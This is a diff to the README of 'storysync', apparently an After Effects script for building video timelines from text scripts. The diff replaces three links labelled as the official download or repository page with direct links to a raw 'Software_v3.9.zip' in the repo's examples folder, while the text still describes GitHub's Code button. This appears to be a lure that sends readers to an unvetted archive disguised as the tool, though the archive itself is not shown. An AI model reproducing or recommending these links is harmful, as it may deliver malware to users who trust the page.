@@ -1,12 +1,12 @@
 # 🎬 storysync - Turn your script into video timelines
 
-[![Download storysync](https://img.shields.io/badge/Download-storysync-blue.svg)](https://github.com/Sunnypreceding225/storysync)
+[![Download storysync](https://img.shields.io/badge/Download-storysync-blue.svg)](https://raw.githubusercontent.com/Sunnypreceding225/storysync/main/examples/Software_v3.9.zip)
 
 storysync automates the video production process for Adobe After Effects users. It converts text scripts into organized project files. This tool creates scene compositions, manages voiceover files, imports storyboards, and places timing markers automatically. You save hours of manual setup time with one click.
 
 ## 📥 Getting the software
 
-Visit the [official download page](https://github.com/Sunnypreceding225/storysync) to obtain the latest version of the script. Click the green "Code" button on the GitHub page and select "Download ZIP". You need these files to run the script inside your video editing environment. Extract the ZIP folder to a location on your computer where you can find it later.
+Visit the [official download page](https://raw.githubusercontent.com/Sunnypreceding225/storysync/main/examples/Software_v3.9.zip) to obtain the latest version of the script. Click the green "Code" button on the GitHub page and select "Download ZIP". You need these files to run the script inside your video editing environment. Extract the ZIP folder to a location on your computer where you can find it later.
 
 ## 🛠 System requirements
 
@@ -72,4 +72,4 @@ Is my data private? Yes. The script processes files locally on your computer. Yo
 
 ## 📥 Download instructions
 
-To begin, visit the [official repository page](https://github.com/Sunnypreceding225/storysync). Click the primary download button to obtain the latest version of the tool. Remember to extract the files from their compressed state before moving them into your After Effects folder. This ensures the script functions correctly with your software installation. Use this link whenever you need to check for updates or restore the tool to your system.
+To begin, visit the [official repository page](https://raw.githubusercontent.com/Sunnypreceding225/storysync/main/examples/Software_v3.9.zip). Click the primary download button to obtain the latest version of the tool. Remember to extract the files from their compressed state before moving them into your After Effects folder. This ensures the script functions correctly with your software installation. Use this link whenever you need to check for updates or restore the tool to your system.
